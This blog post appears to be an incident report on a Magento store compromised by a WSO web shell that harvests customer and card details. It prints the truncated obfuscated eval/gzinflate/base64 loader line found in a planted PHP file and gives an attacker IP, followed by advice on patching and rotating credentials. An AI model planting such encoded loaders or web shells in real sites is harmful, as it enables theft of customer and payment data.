<p>We have detected malicious code running on one of our client&rsquo;s Magento websites. The code in question is harvesting customer details which are then being stolen.</p>

<p>The process is not very sophisticated though it does seem to be effective. Unfortunately investigating it further it seems that there are a number of hacked sites and there are even sensitive details including, in some cases, credit card information that is visible in Google&rsquo;s own cache.</p>

<h3>Analysis</h3>

<p>As is common with this kind of exploit, there is a PHP file that then calls <code>eval</code> on a base64 encoded set of code.</p>

<p>In this case, the file was called abstractleft.php and was located in the Magento shell directory. The contents of the file begin with this:</p>

<figure class='code panel panel-default'><figcaption class='panel-heading'><h3 class='panel-title'></h3></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">PHP</span>
</span><span class='line'>
</span><span class='line'><span class="k">eval</span><span class="p">(</span><span class="nb">gzinflate</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="err">&#39;</span><span class="mi">7</span><span class="nx">f3</span><span class="o">/</span><span class="nx">Xxs38jiO</span><span class="o">/</span><span class="mi">36</span><span class="nx">Px</span><span class="o">/</span><span class="mi">0</span><span class="nx">Pyta92K1tDEnaBg</span><span class="o">....</span>
</span></code></pre></td></tr></table></div></figure>


<p>
The top of the file indicates that it is a web shell.</p>

<p><code>/* WSO 2.1 (Web Shell by pgems.in) */</code></p>

<p>The file is being used to generate a dump of data, with regular POST requests coming from the IP: <code>46.21.151.107</code></p>

<p>In the case of our client, the issue is being resolved quickly and only seems to have been live for a day or so, however looking through Google&rsquo;s index its clear that there are other sites that have been leaking a lot of data.</p>

<p>In the worst case, the Magento sites have been using the Saved Credit Card payment method. This means that the data scrapes have been pulling customer details and also the full card details. This is another reason why it is a <em>really bad idea</em> to use the Saved Credit Card payment method.</p>

<h3>Defense</h3>

<p>It is not clear exactly how the client server was compromised however it is important to ensure that all access credentials are updated and also firewall rules are reviewed and updated.</p>

<p>Ideally we would like to know exactly how the attacker gained access to the server to place the exploit file. This involves examining security logs and other logs. If the attack is not too sophisticated then there is a good chance that there is a lot of debug information that should be helpful in finding out exactly how the attack has taken place.</p>

<p>The main thing for Magento sites now though is to ensure that all security patches have been applied. If your live site has not been patched then really you must expect this kind of hack.</p>
